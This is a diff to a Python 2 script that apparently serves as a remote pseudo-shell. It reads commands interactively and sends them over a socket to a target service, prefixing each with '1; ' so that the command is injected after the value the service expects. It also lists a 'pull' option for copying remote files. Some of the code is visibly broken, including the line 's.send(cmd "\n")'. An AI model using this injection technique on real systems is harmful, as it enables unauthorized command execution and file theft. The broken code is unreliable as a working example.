@@ -34,31 +34,38 @@ def execute_cmd(cmd, prompt):
 
  			s.send("something to send\n")   # Send a newline \n at the end of your command
 	"""
+	global global_prompt
+
 	if cmd == "help":
 
 		print("shell, pull <remote-path> <local-path>, help, quit, exit")
 	elif cmd == "shell":
 
-		int exit = 0
+		exit = 0
+
+		temp = global_prompt
 
 		global_prompt = "/" + global_prompt
 
-		while exit = 0:
+		while exit == 0:
 
-			inner_cmd = input(global_prompt)
+			inner_cmd = raw_input(global_prompt)
 
-			print("\n")
+			#print("\n")
 
-			if inner_cmd = = ("exit" || "quit"):
+			if inner_cmd == ("exit"):
+
+				exit = 1
+			elif inner_cmd == ("quit"):
 
 				exit = 1
 			else:
 
-				execute_cmd(inner_cmd, global_prompt)
+				execute_cmd(("1; " + inner_cmd), global_prompt)
 
-			print("\n")
+			#print("\n")
 
-		global_prompt = "> "
+		global_prompt = temp
 
 	else:
 
@@ -71,7 +78,7 @@ def execute_cmd(cmd, prompt):
 		data = s.recv(1024)
 
 
-		s.send(cmd)
+		s.send(cmd "\n")
 
 		time.sleep(1)
 
@@ -80,19 +87,25 @@ def execute_cmd(cmd, prompt):
 
 
 if __name__ == '__main__':
-	int exit = 0
+
+	global global_prompt
+
+	exit = 0
 
 	while exit == 0:
 
-		cmd = input(global_prompt)
+		cmd = raw_input(global_prompt)
 
-		print("\n")
+		#print("\n")
 
-		if cmd == ("exit" || "quit"):
+		if cmd == ("exit"):
+
+			exit = 1
+		elif cmd == ("quit"):
 
 			exit = 1
 		else:
 
-			execute_cmd(cmd, global_prompt)
+			execute_cmd(("1; " + cmd), global_prompt)
 
-		print("\n")
+		#print("\n")
